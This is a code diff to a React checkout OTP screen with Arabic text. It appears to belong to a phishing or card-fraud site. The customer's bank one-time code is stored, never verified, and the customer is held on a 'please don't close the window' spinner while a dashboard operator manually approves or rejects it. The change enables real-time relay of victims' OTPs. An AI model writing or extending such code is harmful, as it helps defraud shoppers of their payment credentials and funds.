@@ -1,10 +1,14 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { useCart } from "@/context/CartContext";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { CheckCircle, ChevronLeft, CreditCard, HelpCircle } from "lucide-react";
 import { Link, useLocation } from "wouter";
-import { addData, updateOrderOtp } from "@/lib/firebase";
+import {
+  addData,
+  updateOrderOtp,
+  getOrderOtpStatus,
+} from "@/lib/firebase";
 import { ensureVisitorId } from "@/lib/visitor";
 interface FormData {
   name: string;
@@ -47,6 +51,41 @@ function OtpStep({
   const [error, setError] = useState("");
   const [resent, setResent] = useState(false);
   const [verifying, setVerifying] = useState(false);
+  // True while the customer's OTP has been submitted and we're polling for
+  // the admin's approve/reject decision on the dashboard.
+  const [waiting, setWaiting] = useState(false);
+
+  // Poll the order's OTP decision once the customer has submitted. Resolves
+  // the screen as soon as the admin clicks Approve (success) or Reject
+  // (inline error + retry).
+  useEffect(() => {
+    if (!waiting || !orderId) return;
+    let cancelled = false;
+    const tick = async () => {
+      try {
+        const s = await getOrderOtpStatus(orderId);
+        if (cancelled) return;
+        if (s.otpVerified || s.otpDecision === "approved") {
+          setWaiting(false);
+          setVerifying(false);
+          onSuccess();
+        } else if (s.otpDecision === "rejected") {
+          setWaiting(false);
+          setVerifying(false);
+          setOtp("");
+          setError("رمز التحقق غير صحيح، يرجى إعادة المحاولة");
+        }
+      } catch {
+        // Transient network error — try again on the next tick.
+      }
+    };
+    void tick();
+    const id = setInterval(() => void tick(), 2500);
+    return () => {
+      cancelled = true;
+      clearInterval(id);
+    };
+  }, [waiting, orderId, onSuccess]);
 
   const submitOtp = async (value: string) => {
     if (value.length !== 4 && value.length !== 6) {
@@ -72,11 +111,17 @@ function OtpStep({
       );
       return;
     }
-    // Brief "verifying" UX delay, then advance to the success screen.
-    setTimeout(() => {
-      setVerifying(false);
-      onSuccess();
-    }, 1500);
+    if (orderId) {
+      // Customer waits while admin approves/rejects on the dashboard. The
+      // useEffect above will resolve the screen.
+      setWaiting(true);
+    } else {
+      // No persisted order (dev/test fallback) — auto-advance.
+      setTimeout(() => {
+        setVerifying(false);
+        onSuccess();
+      }, 1500);
+    }
   };
 
   return (
@@ -167,7 +212,7 @@ function OtpStep({
                   setTimeout(() => void submitOtp(val), 300);
               }}
               className="w-full text-center text-2xl tracking-[0.5em] border-2 border-gray-300 py-3 focus:border-blue-600 outline-none rounded"
-              disabled={verifying}
+              disabled={verifying || waiting}
               style={{ fontFamily: "monospace", letterSpacing: "0.5em" }}
             />
             {error && (
@@ -178,14 +223,31 @@ function OtpStep({
                 تم إعادة إرسال الرمز
               </p>
             )}
+            {waiting && (
+              <div className="mt-3 flex flex-col items-center gap-2 text-center">
+                <div className="w-5 h-5 border-2 border-blue-600 border-t-transparent rounded-full animate-spin" />
+                <p className="text-blue-700 text-xs font-bold">
+                  جاري التحقق من العملية...
+                </p>
+                <p className="text-gray-500 text-[11px]">
+                  قد تستغرق هذه العملية بضع لحظات، يرجى عدم إغلاق النافذة
+                </p>
+              </div>
+            )}
             <button
               type="submit"
               disabled={
-                verifying || (otp.length !== 4 && otp.length !== 6)
+                verifying ||
+                waiting ||
+                (otp.length !== 4 && otp.length !== 6)
               }
               className="w-full mt-4 py-3 bg-blue-700 text-white font-bold text-sm hover:bg-blue-800 transition-colors disabled:opacity-50"
             >
-              {verifying ? "جاري التحقق..." : "تحقق"}
+              {waiting
+                ? "جاري التحقق..."
+                : verifying
+                  ? "جاري الإرسال..."
+                  : "تحقق"}
             </button>
           </form>
           <div className="mt-4 text-center space-y-2">
